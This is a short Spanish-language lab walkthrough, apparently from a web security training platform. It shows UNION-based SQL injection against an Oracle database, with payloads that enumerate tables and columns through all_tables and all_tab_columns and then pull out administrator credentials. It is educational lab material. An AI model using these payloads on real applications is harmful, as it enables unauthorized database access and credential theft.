Lab: SQL injection attack, listing the database contents on Oracle

üéØ Objetivo

Acceder a las tablas del sistema de Oracle para identificar la tabla de usuarios, sus columnas y extraer las credenciales del usuario administrator.

- Enumeraci√≥n de Tablas

En Oracle, en lugar de information_schema, consultamos all_tables.

Payload para listar tablas: [source,sql]

 ' UNION SELECT table_name, NULL FROM all_tables--
 
image:img/SQL-6.1.png[]

Nota: Busca una tabla que empiece por USERS_ (en Oracle los nombres suelen estar en may√∫sculas).

image:img/SQL-6.2.png[]

- Enumeraci√≥n de Columnas

Una vez identificado el nombre de la tabla (USERS_RXOGMP), consultamos all_tab_columns.

Payload para listar columnas: [source,sql]

 ' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name = 'USERS_JONUYY'--

Tuve que reiniciar por un error por eso ahora la tabla se llama 'JONUYY'

image:img/200.png[]

Busca nombres: USERNAME_ABCDEF y PASSWORD_ABCDEF.

image:img/SQL-6.3.png[]

USERNAME_VLHRIJ
PASSWORD_ZOVAKT

- Exfiltraci√≥n de Credenciales

Con los nombres exactos de tabla y columnas, lanzamos el ataque final.

Payload final: [source,sql]

 ' UNION SELECT USERNAME_VLHRIJ, PASSWORD_ZOVAKT FROM USERS_JONUYY--

image:img/SQL-6.4.png[]